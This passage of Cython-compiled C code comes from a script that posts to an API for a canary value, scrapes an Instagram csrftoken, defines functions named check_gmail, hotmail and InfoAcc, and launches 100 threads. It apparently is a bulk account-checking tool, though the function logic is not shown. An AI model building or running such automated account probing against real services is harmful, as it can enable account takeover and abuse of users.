        if (PyDict_SetItem(__pyx_t_19, __pyx_n_u_treatments, __pyx_t_11) < 0) __PYX_ERR(0, 369, __pyx_L20_error)
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;

        
        __pyx_t_11 = PyList_New(1); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 367, __pyx_L20_error)
        __Pyx_GOTREF(__pyx_t_11);
        __Pyx_GIVEREF(__pyx_t_19);
        PyList_SET_ITEM(__pyx_t_11, 0, __pyx_t_19);
        __pyx_t_19 = 0;
        if (PyDict_SetItem(__pyx_t_18, __pyx_n_u_clientExperiments, __pyx_t_11) < 0) __PYX_ERR(0, 367, __pyx_L20_error)
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_json_data, __pyx_t_18) < 0) __PYX_ERR(0, 366, __pyx_L20_error)
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;

        
        __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_requests); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 378, __pyx_L20_error)
        __Pyx_GOTREF(__pyx_t_11);
        __pyx_t_19 = __Pyx_PyObject_GetAttrStr(__pyx_t_11, __pyx_n_s_post); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 378, __pyx_L20_error)
        __Pyx_GOTREF(__pyx_t_19);
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;

        
        __pyx_t_11 = __Pyx_PyDict_NewPresized(3); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 380, __pyx_L20_error)
        __Pyx_GOTREF(__pyx_t_11);
        __Pyx_GetModuleGlobalName(__pyx_t_17, __pyx_n_s_cookies); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 380, __pyx_L20_error)
        __Pyx_GOTREF(__pyx_t_17);
        if (PyDict_SetItem(__pyx_t_11, __pyx_n_s_cookies, __pyx_t_17) < 0) __PYX_ERR(0, 380, __pyx_L20_error)
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;

        
        __Pyx_GetModuleGlobalName(__pyx_t_17, __pyx_n_s_headers); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 381, __pyx_L20_error)
        __Pyx_GOTREF(__pyx_t_17);
        if (PyDict_SetItem(__pyx_t_11, __pyx_n_s_headers, __pyx_t_17) < 0) __PYX_ERR(0, 380, __pyx_L20_error)
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;

        
        __Pyx_GetModuleGlobalName(__pyx_t_17, __pyx_n_s_json_data); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 382, __pyx_L20_error)
        __Pyx_GOTREF(__pyx_t_17);
        if (PyDict_SetItem(__pyx_t_11, __pyx_n_s_json, __pyx_t_17) < 0) __PYX_ERR(0, 380, __pyx_L20_error)
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;

        
        __pyx_t_17 = __Pyx_PyObject_Call(__pyx_t_19, __pyx_tuple__107, __pyx_t_11); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 378, __pyx_L20_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;

        
        __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_t_17, __pyx_n_s_json); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 383, __pyx_L20_error)
        __Pyx_GOTREF(__pyx_t_11);
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        __pyx_t_17 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_11))) {
          __pyx_t_17 = PyMethod_GET_SELF(__pyx_t_11);
          if (likely(__pyx_t_17)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_11);
            __Pyx_INCREF(__pyx_t_17);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_11, function);
          }
        }
        __pyx_t_18 = (__pyx_t_17) ? __Pyx_PyObject_CallOneArg(__pyx_t_11, __pyx_t_17) : __Pyx_PyObject_CallNoArg(__pyx_t_11);
        __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
        if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 383, __pyx_L20_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_response, __pyx_t_18) < 0) __PYX_ERR(0, 378, __pyx_L20_error)
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;

        
        __Pyx_GetModuleGlobalName(__pyx_t_18, __pyx_n_s_response); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 384, __pyx_L20_error)
        __Pyx_GOTREF(__pyx_t_18);
        __pyx_t_11 = __Pyx_PyObject_Dict_GetItem(__pyx_t_18, __pyx_n_u_apiCanary_2); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 384, __pyx_L20_error)
        __Pyx_GOTREF(__pyx_t_11);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_canary, __pyx_t_11) < 0) __PYX_ERR(0, 384, __pyx_L20_error)
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;

        
        goto __pyx_L25_try_break;

        
      }
      __pyx_L20_error:;
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
      __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
      __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
      __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
      __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
      __Pyx_XDECREF(__pyx_t_19); __pyx_t_19 = 0;
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;

      
      __pyx_t_15 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_BaseException);
      if (__pyx_t_15) {
        __Pyx_ErrRestore(0,0,0);
        goto __pyx_L21_exception_handled;
      }
      goto __pyx_L22_except_error;
      __pyx_L22_except_error:;

      
      __Pyx_XGIVEREF(__pyx_t_10);
      __Pyx_XGIVEREF(__pyx_t_9);
      __Pyx_XGIVEREF(__pyx_t_8);
      __Pyx_ExceptionReset(__pyx_t_10, __pyx_t_9, __pyx_t_8);
      goto __pyx_L1_error;
      __pyx_L25_try_break:;
      __Pyx_XGIVEREF(__pyx_t_10);
      __Pyx_XGIVEREF(__pyx_t_9);
      __Pyx_XGIVEREF(__pyx_t_8);
      __Pyx_ExceptionReset(__pyx_t_10, __pyx_t_9, __pyx_t_8);
      goto __pyx_L19_break;
      __pyx_L21_exception_handled:;
      __Pyx_XGIVEREF(__pyx_t_10);
      __Pyx_XGIVEREF(__pyx_t_9);
      __Pyx_XGIVEREF(__pyx_t_8);
      __Pyx_ExceptionReset(__pyx_t_10, __pyx_t_9, __pyx_t_8);
    }
  }
  __pyx_L19_break:;

  
  while (1) {

    
    {
      __Pyx_PyThreadState_declare
      __Pyx_PyThreadState_assign
      __Pyx_ExceptionSave(&__pyx_t_8, &__pyx_t_9, &__pyx_t_10);
      __Pyx_XGOTREF(__pyx_t_8);
      __Pyx_XGOTREF(__pyx_t_9);
      __Pyx_XGOTREF(__pyx_t_10);
      /*try:*/ {

        
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_a, __pyx_kp_u_https_www_instagram_com_accounts) < 0) __PYX_ERR(0, 391, __pyx_L30_error)

        
        __Pyx_GetModuleGlobalName(__pyx_t_18, __pyx_n_s_requests); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 392, __pyx_L30_error)
        __Pyx_GOTREF(__pyx_t_18);
        __pyx_t_17 = __Pyx_PyObject_GetAttrStr(__pyx_t_18, __pyx_n_s_Session); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 392, __pyx_L30_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        __pyx_t_18 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_17))) {
          __pyx_t_18 = PyMethod_GET_SELF(__pyx_t_17);
          if (likely(__pyx_t_18)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_17);
            __Pyx_INCREF(__pyx_t_18);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_17, function);
          }
        }
        __pyx_t_11 = (__pyx_t_18) ? __Pyx_PyObject_CallOneArg(__pyx_t_17, __pyx_t_18) : __Pyx_PyObject_CallNoArg(__pyx_t_17);
        __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
        if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 392, __pyx_L30_error)
        __Pyx_GOTREF(__pyx_t_11);
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_session, __pyx_t_11) < 0) __PYX_ERR(0, 392, __pyx_L30_error)
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;

        
        __Pyx_GetModuleGlobalName(__pyx_t_17, __pyx_n_s_session); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 393, __pyx_L30_error)
        __Pyx_GOTREF(__pyx_t_17);
        __pyx_t_18 = __Pyx_PyObject_GetAttrStr(__pyx_t_17, __pyx_n_s_get); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 393, __pyx_L30_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        __Pyx_GetModuleGlobalName(__pyx_t_17, __pyx_n_s_a); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 393, __pyx_L30_error)
        __Pyx_GOTREF(__pyx_t_17);
        __pyx_t_19 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_18))) {
          __pyx_t_19 = PyMethod_GET_SELF(__pyx_t_18);
          if (likely(__pyx_t_19)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_18);
            __Pyx_INCREF(__pyx_t_19);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_18, function);
          }
        }
        __pyx_t_11 = (__pyx_t_19) ? __Pyx_PyObject_Call2Args(__pyx_t_18, __pyx_t_19, __pyx_t_17) : __Pyx_PyObject_CallOneArg(__pyx_t_18, __pyx_t_17);
        __Pyx_XDECREF(__pyx_t_19); __pyx_t_19 = 0;
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 393, __pyx_L30_error)
        __Pyx_GOTREF(__pyx_t_11);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_aa, __pyx_t_11) < 0) __PYX_ERR(0, 393, __pyx_L30_error)
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;

        
        __Pyx_GetModuleGlobalName(__pyx_t_18, __pyx_n_s_aa); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 394, __pyx_L30_error)
        __Pyx_GOTREF(__pyx_t_18);
        __pyx_t_17 = __Pyx_PyObject_GetAttrStr(__pyx_t_18, __pyx_n_s_cookies); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 394, __pyx_L30_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        __pyx_t_18 = __Pyx_PyObject_GetAttrStr(__pyx_t_17, __pyx_n_s_get); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 394, __pyx_L30_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        __pyx_t_17 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_18))) {
          __pyx_t_17 = PyMethod_GET_SELF(__pyx_t_18);
          if (likely(__pyx_t_17)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_18);
            __Pyx_INCREF(__pyx_t_17);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_18, function);
          }
        }
        __pyx_t_11 = (__pyx_t_17) ? __Pyx_PyObject_Call2Args(__pyx_t_18, __pyx_t_17, __pyx_n_u_csrftoken_2) : __Pyx_PyObject_CallOneArg(__pyx_t_18, __pyx_n_u_csrftoken_2);
        __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
        if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 394, __pyx_L30_error)
        __Pyx_GOTREF(__pyx_t_11);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_csrf, __pyx_t_11) < 0) __PYX_ERR(0, 394, __pyx_L30_error)
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;

        
        goto __pyx_L35_try_break;

        
      }
      __pyx_L30_error:;
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
      __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
      __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
      __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
      __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
      __Pyx_XDECREF(__pyx_t_19); __pyx_t_19 = 0;
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;

      
      __pyx_t_15 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_BaseException);
      if (__pyx_t_15) {
        __Pyx_ErrRestore(0,0,0);
        goto __pyx_L31_exception_handled;
      }
      goto __pyx_L32_except_error;
      __pyx_L32_except_error:;

      
      __Pyx_XGIVEREF(__pyx_t_8);
      __Pyx_XGIVEREF(__pyx_t_9);
      __Pyx_XGIVEREF(__pyx_t_10);
      __Pyx_ExceptionReset(__pyx_t_8, __pyx_t_9, __pyx_t_10);
      goto __pyx_L1_error;
      __pyx_L35_try_break:;
      __Pyx_XGIVEREF(__pyx_t_8);
      __Pyx_XGIVEREF(__pyx_t_9);
      __Pyx_XGIVEREF(__pyx_t_10);
      __Pyx_ExceptionReset(__pyx_t_8, __pyx_t_9, __pyx_t_10);
      goto __pyx_L29_break;
      __pyx_L31_exception_handled:;
      __Pyx_XGIVEREF(__pyx_t_8);
      __Pyx_XGIVEREF(__pyx_t_9);
      __Pyx_XGIVEREF(__pyx_t_10);
      __Pyx_ExceptionReset(__pyx_t_8, __pyx_t_9, __pyx_t_10);
    }
  }
  __pyx_L29_break:;

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_yy, __pyx_n_u_azertyuiopmlkjhgfdsqwxcvbn) < 0) __PYX_ERR(0, 399, __pyx_L1_error)

  
  __pyx_t_11 = __Pyx_CyFunction_New(&__pyx_mdef_6source_11tll, 0, __pyx_n_s_tll, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__109)); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 402, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_11);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_tll, __pyx_t_11) < 0) __PYX_ERR(0, 402, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_tll); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 452, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_11);
  __pyx_t_18 = __Pyx_PyObject_CallNoArg(__pyx_t_11); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 452, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_18);
  __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
  __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;

  
  __pyx_t_18 = __Pyx_CyFunction_New(&__pyx_mdef_6source_13check_gmail, 0, __pyx_n_s_check_gmail, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__111)); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 455, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_18);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_check_gmail, __pyx_t_18) < 0) __PYX_ERR(0, 455, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;

  
  __pyx_t_18 = __Pyx_CyFunction_New(&__pyx_mdef_6source_15hotmail, 0, __pyx_n_s_hotmail, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__113)); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 511, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_18);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_hotmail, __pyx_t_18) < 0) __PYX_ERR(0, 511, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;

  
  __pyx_t_18 = __Pyx_CyFunction_New(&__pyx_mdef_6source_17check, 0, __pyx_n_s_check, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__115)); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 545, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_18);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_check, __pyx_t_18) < 0) __PYX_ERR(0, 545, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;

  
  __pyx_t_18 = __Pyx_CyFunction_New(&__pyx_mdef_6source_19rest, 0, __pyx_n_s_rest, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__117)); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 582, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_18);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_rest, __pyx_t_18) < 0) __PYX_ERR(0, 582, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;

  
  __pyx_t_18 = __Pyx_CyFunction_New(&__pyx_mdef_6source_21date, 0, __pyx_n_s_date, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__119)); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 620, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_18);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_date, __pyx_t_18) < 0) __PYX_ERR(0, 620, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;

  
  __pyx_t_18 = __Pyx_CyFunction_New(&__pyx_mdef_6source_23InfoAcc, 0, __pyx_n_s_InfoAcc, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__121)); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 644, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_18);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_InfoAcc, __pyx_t_18) < 0) __PYX_ERR(0, 644, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;

  
  __pyx_t_18 = __Pyx_CyFunction_New(&__pyx_mdef_6source_25eizon, 0, __pyx_n_s_eizon, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__123)); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 709, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_18);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_eizon, __pyx_t_18) < 0) __PYX_ERR(0, 709, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;

  
  for (__pyx_t_20 = 0; __pyx_t_20 < 0x64; __pyx_t_20+=1) {
    __pyx_t_18 = __Pyx_PyInt_From_long(__pyx_t_20); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 740, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_18);
    if (PyDict_SetItem(__pyx_d, __pyx_n_s__94, __pyx_t_18) < 0) __PYX_ERR(0, 740, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;

    
    __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_Thread); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 741, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_11);
    __pyx_t_17 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 741, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_17);
    __Pyx_GetModuleGlobalName(__pyx_t_19, __pyx_n_s_eizon); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 741, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_19);
    if (PyDict_SetItem(__pyx_t_17, __pyx_n_s_target, __pyx_t_19) < 0) __PYX_ERR(0, 741, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;
    __pyx_t_19 = __Pyx_PyObject_Call(__pyx_t_11, __pyx_empty_tuple, __pyx_t_17); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 741, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_19);
    __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
    __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
    __pyx_t_17 = __Pyx_PyObject_GetAttrStr(__pyx_t_19, __pyx_n_s_start); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 741, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_17);
    __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;
    __pyx_t_19 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_17))) {
      __pyx_t_19 = PyMethod_GET_SELF(__pyx_t_17);
      if (likely(__pyx_t_19)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_17);
        __Pyx_INCREF(__pyx_t_19);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_17, function);
      }
    }
    __pyx_t_18 = (__pyx_t_19) ? __Pyx_PyObject_CallOneArg(__pyx_t_17, __pyx_t_19) : __Pyx_PyObject_CallNoArg(__pyx_t_17);
    __Pyx_XDECREF(__pyx_t_19); __pyx_t_19 = 0;
    if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 741, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_18);
    __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
    __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
  }

  
  __pyx_t_18 = __Pyx_CyFunction_New(&__pyx_mdef_6source_27pppp, 0, __pyx_n_s_pppp, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__124)); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 744, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_18);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_pppp, __pyx_t_18) < 0) __PYX_ERR(0, 744, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;

  
  __pyx_t_18 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_18);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_test, __pyx_t_18) < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;

  /*--- Wrapped vars code ---*/

  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_11);
  __Pyx_XDECREF(__pyx_t_12);
  __Pyx_XDECREF(__pyx_t_16);
  __Pyx_XDECREF(__pyx_t_17);
  __Pyx_XDECREF(__pyx_t_18);
  __Pyx_XDECREF(__pyx_t_19);
  if (__pyx_m) {
    if (__pyx_d) {
      __Pyx_AddTraceback("init source", __pyx_clineno, __pyx_lineno, __pyx_filename);
    }
    Py_CLEAR(__pyx_m);
  } else if (!PyErr_Occurred()) {
    PyErr_SetString(PyExc_ImportError, "init source");
  }
  __pyx_L0:;
  __Pyx_RefNannyFinishContext();
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  return (__pyx_m != NULL) ? 0 : -1;
  #elif PY_MAJOR_VERSION >= 3
  return __pyx_m;
  #else
  return;
  #endif
}

/* --- Runtime support code --- */
/* Refnanny */
#if CYTHON_REFNANNY
static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname) {
    PyObject *m = NULL, *p = NULL;
    void *r = NULL;
    m = PyImport_ImportModule(modname);
    if (!m) goto end;
    p = PyObject_GetAttrString(m, "RefNannyAPI");
    if (!p) goto end;
    r = PyLong_AsVoidPtr(p);
end:
    Py_XDECREF(p);
    Py_XDECREF(m);
    return (__Pyx_RefNannyAPIStruct *)r;
}
#endif

/* PyObjectGetAttrStr */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name) {
    PyTypeObject* tp = Py_TYPE(obj);
    if (likely(tp->tp_getattro))
        return tp->tp_getattro(obj, attr_name);
#if PY_MAJOR_VERSION < 3
    if (likely(tp->tp_getattr))
        return tp->tp_getattr(obj, PyString_AS_STRING(attr_name));
#endif
    return PyObject_GetAttr(obj, attr_name);
}
#endif

/* GetBuiltinName */
static PyObject *__Pyx_GetBuiltinName(PyObject *name) {
    PyObject* result = __Pyx_PyObject_GetAttrStr(__pyx_b, name);
    if (unlikely(!result)) {
        PyErr_Format(PyExc_NameError,
#if PY_MAJOR_VERSION >= 3
            "name '%U' is not defined", name);
#else
            "name '%.200s' is not defined", PyString_AS_STRING(name));
#endif
    }
    return result;
}

/* RaiseArgTupleInvalid */
static void __Pyx_RaiseArgtupleInvalid(
    const char* func_name,
    int exact,
    Py_ssize_t num_min,
    Py_ssize_t num_max,
    Py_ssize_t num_found)
{
    Py_ssize_t num_expected;
    const char *more_or_less;
    if (num_found < num_min) {
        num_expected = num_min;
        more_or_less = "at least";
    } else {
        num_expected = num_max;
        more_or_less = "at most";
    }
    if (exact) {
        more_or_less = "exactly";
    }
    PyErr_Format(PyExc_TypeError,
                 "%.200s() takes %.8s %" CYTHON_FORMAT_SSIZE_T "d positional argument%.1s (%" CYTHON_FORMAT_SSIZE_T "d given)",
                 func_name, more_or_less, num_expected,
                 (num_expected == 1) ? "" : "s", num_found);
}

/* RaiseDoubleKeywords */
static void __Pyx_RaiseDoubleKeywordsError(
    const char* func_name,
    PyObject* kw_name)
{
    PyErr_Format(PyExc_TypeError,
        #if PY_MAJOR_VERSION >= 3
        "%s() got multiple values for keyword argument '%U'", func_name, kw_name);
        #else
        "%s() got multiple values for keyword argument '%s'", func_name,
        PyString_AsString(kw_name));
        #endif
}

/* ParseKeywords */
static int __Pyx_ParseOptionalKeywords(
    PyObject *kwds,
    PyObject **argnames[],
    PyObject *kwds2,
    PyObject *values[],
    Py_ssize_t num_pos_args,
    const char* function_name)
{
    PyObject *key = 0, *value = 0;
    Py_ssize_t pos = 0;
    PyObject*** name;
    PyObject*** first_kw_arg = argnames + num_pos_args;
    while (PyDict_Next(kwds, &pos, &key, &value)) {
        name = first_kw_arg;
        while (*name && (**name != key)) name++;
        if (*name) {
            values[name-argnames] = value;
            continue;
        }
        name = first_kw_arg;
        #if PY_MAJOR_VERSION < 3
        if (likely(PyString_Check(key))) {
            while (*name) {
                if ((CYTHON_COMPILING_IN_PYPY || PyString_GET_SIZE(**name) == PyString_GET_SIZE(key))
                        && _PyString_Eq(**name, key)) {
                    values[name-argnames] = value;
                    break;
                }
                name++;
            }
            if (*name) continue;
            else {
                PyObject*** argname = argnames;
                while (argname != first_kw_arg) {
                    if ((**argname == key) || (
                            (CYTHON_COMPILING_IN_PYPY || PyString_GET_SIZE(**argname) == PyString_GET_SIZE(key))
                             && _PyString_Eq(**argname, key))) {
                        goto arg_passed_twice;
                    }
                    argname++;
                }
            }
        } else
        #endif
        if (likely(PyUnicode_Check(key))) {
            while (*name) {
                int cmp = (**name == key) ? 0 :
                #if !CYTHON_COMPILING_IN_PYPY && PY_MAJOR_VERSION >= 3
                    (__Pyx_PyUnicode_GET_LENGTH(**name) != __Pyx_PyUnicode_GET_LENGTH(key)) ? 1 :
                #endif
                    PyUnicode_Compare(**name, key);
                if (cmp < 0 && unlikely(PyErr_Occurred())) goto bad;
                if (cmp == 0) {
                    values[name-argnames] = value;
                    break;
                }
                name++;
            }
            if (*name) continue;
            else {
                PyObject*** argname = argnames;
                while (argname != first_kw_arg) {
                    int cmp = (**argname == key) ? 0 :
                    #if !CYTHON_COMPILING_IN_PYPY && PY_MAJOR_VERSION >= 3
                        (__Pyx_PyUnicode_GET_LENGTH(**argname) != __Pyx_PyUnicode_GET_LENGTH(key)) ? 1 :
                    #endif
                        PyUnicode_Compare(**argname, key);
